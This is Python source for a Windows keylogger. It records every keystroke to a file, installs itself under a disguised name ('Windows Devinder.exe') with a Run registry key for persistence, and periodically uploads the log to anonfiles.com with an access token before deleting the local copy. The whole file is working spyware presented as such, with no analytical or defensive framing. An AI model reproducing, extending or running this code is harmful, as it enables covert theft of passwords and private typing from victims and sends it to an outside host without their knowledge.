# -*- coding: utf-8 -*-
# TODO Author: Abdulrahman Mohammed (De3vil)
# TODO Don't touch my code, it's art 
#+==============================
from pynput.keyboard import Listener , Key
import requests , shutil , subprocess
import threading
from requests import post
from os import getenv , environ , path , chdir , remove
from sys import executable
class I_see_u:
    def __init__(self,token,time_interval):
        self.filename = getenv("Computername")+".txt"
        self.token = token
        self.time_interval = time_interval*60
        self.text = ""
        self.paths = path.join(environ["USERPROFILE"],"AppData","Local","temp")
        chdir(self.paths)
    def persistent_on_windows(self):
        _file_location = environ["appdata"] + "\\Windows Devinder.exe"
        if not path.exists(_file_location):
            shutil.copyfile(executable, _file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d  "' + _file_location + '"', shell=True)
    # TODO: Add all the letters           (Done)
    # TODO: Add all quotation marks       (Done)
    def KeyMin(self,argument):              
        switcher = {
            "'a'": "a",
            "'e'": "e",
            "'i'": "i",
            "'o'": "o",
            "'u'": "u",
            "'b'": "b",
            "'c'": "c",
            "'d'": "d",
            "'f'": "f",
            "'g'": "g",
            "'h'": "h",
            "'j'": "j",
            "'J'": "J",
            "'k'": "k",
            "'l'": "l",
            "'m'": "m",
            "'n'": "n",
            "'ñ'": "ñ",
            "'p'": "p",
            "'q'": "q",
            "'r'": "r",
            "'s'": "s",
            "'t'": "t",
            "'v'": "v",
            "'w'": "w",
            "'x'": "x",
            "'y'": "y",
            "'z'": "z",
            "','": ",",                     # ,
            "'.'": ".",                     # .
            "'_'": "_",                     # _
            "'-'": "-",                     # -
            "':'": ":",                     #
            "'A'": "A",
            "'E'": "E",
            "'I'": "I",
            "'O'": "O",
            "'U'": "U",
            "'B'": "B",
            "'C'": "C",
            "'D'": "D",
            "'F'": "F",
            "'G'": "G",
            "'H'": "H",
            "'K'": "K",
            "'L'": "L",
            "'M'": "M",
            "'N'": "N",
            "'Ñ'": "Ñ",
            "'P'": "P",
            "'Q'": "Q",
            "'R'": "R",
            "'S'": "S",
            "'T'": "T",
            "'V'": "V",
            "'W'": "W",
            "'X'": "X",
            "'Y'": "Y",
            "'Z'": "Z",
            "'1'": "1",
            "'2'": "2",
            "'3'": "3",
            "'4'": "4",
            "'5'": "5",
            "'6'": "6",
            "'7'": "7",
            "'8'": "8",
            "'9'": "9",
            "'0'": "0",
            "'@'": "@",                     # @
            "'#'": "#",                     # #
            "'*'": "*",                     #
            "'('": "(",                     # (
            "')'": ")",                     # )
            "'?'": "?",                     # ?
            "'='": "=",                     # =
            "'+'": "+",                     # +
            "'!'": "!",                     # !
            "'}'": "}",                     # }
            "'{'": "{",                     # {}
            "'´'": "´",                     # ´
            "'|'": "|",                     # |
            "'°'": "°",                     # °
            "'^'": "¬",                     # ^
            "';'": ";",                     #
            "'$'": "$",                     # $
            "'%'": "%",                     # %
            "'&'": "&",                     # &
            "'>'": ">",                     #
            "'<'": "<",                     # 
            "'/'": "/",                     # /
            "'¿'": "¿",                     # ¿
            "'¡'": "¡",                     # ¡
            "'~'": "~" ,                     #
            "'ا '": "أ "
        }
        return switcher.get(argument, "")

# TODO: Add all Numers    Optimized (Done)
    def KeyMax(self,argument):                
        switcher = {
            "Key.space": " ",               
            "Key.backspace": "«",           
            "Key.enter": "\r\n",              
            "Key.tab": "",              
            "Key.delete":" «×» ",           
            "<96>": "0",                 # 0
            "<97>": "1",                 # 1
            "<98>": "2",                 # 2
            "<99>": "3",                 # 3
            "<100>": "4",                # 4
            "<101>": "5",                # 5
            "<102>": "6",                # 6
            "<103>": "7",                # 7
            "<104>": "8",                # 8
            "<105>": "9",                # 9
            "None<96>": "0",                 # 0
            "None<97>": "1",                 # 1
            "None<98>": "2",                 # 2
            "None<99>": "3",                 # 3
            "None<100>": "4",                # 4
            "None<101>": "5",                # 5
            "None<102>": "6",                # 6
            "None<103>": "7",                # 7
            "None<104>": "8",                # 8
            "None<105>": "9",                # 9
            "['^']": "^",
            "['`']": "`",                     #
            "['¨']": "¨",                     #
            "['´']": "´",                     #
            "<110>": ".",                     #
            "None<110>": ".",                 #
            "Key.alt_l": " [Alt L] ",         #
            "Key.alt_r": " [Alt R] ",
            "Key.shift_r": " [Shift R] ",
            "Key.shift": " [Shift L] ",
            "Key.ctrl_r": " [Control R] ",    #
            "Key.ctrl_l": " [Control L] ",    #
            "Key.right" : " [Right] ",                 #
            "Key.left"  : " [Left] ",                  #
            "Key.up"    : " [Up]",                    #
            "Key.down"  : " [Down] ",                  #
            # "'\x16'"  : " [None] ",
            # "'\x18'"  : " [None] ", 
            # "'\x03'"  : " [None] ", 
            "Key.caps_lock"  : " [Mayus lock] ",  
            # "Key.media_previous"    : " ♫ ",     #
            # "Key.media_next"        : " ♫→ ",         #
            # "Key.media_play_pause"  : " ■ ♫ ■ ",#
            "Key.cmd"               : " [Windows] "
        }
        return switcher.get(argument, "")

    def on_press(self,key):
        
        with open(f"{self.filename}",mode='a' , encoding='utf-8') as file_txt:
            if (len(str(key)))  <= 3:
                file_txt.write(self.KeyMin(str(key)))
            else:
                file_txt.write(self.KeyMax(str(key)))
    # TODO:  (DONE)
 
    def send_mega_req(self):

        try:        
            # print(self.text)
            timer = threading.Timer(self.time_interval, self.send_mega_req).start()
            files = {'file': (f'{self.filename}', open(f"{self.filename}", 'rb'))}
            url = f'https://api.anonfiles.com/upload?token={self.token}'
            post(url, files=files)
            remove(self.filename) 
        except Exception as e:
            pass
            # print(e)

    def Run(self):
        self.persistent_on_windows()
        with Listener(on_press=self.on_press) as listener:
            self.send_mega_req()
            listener.join()


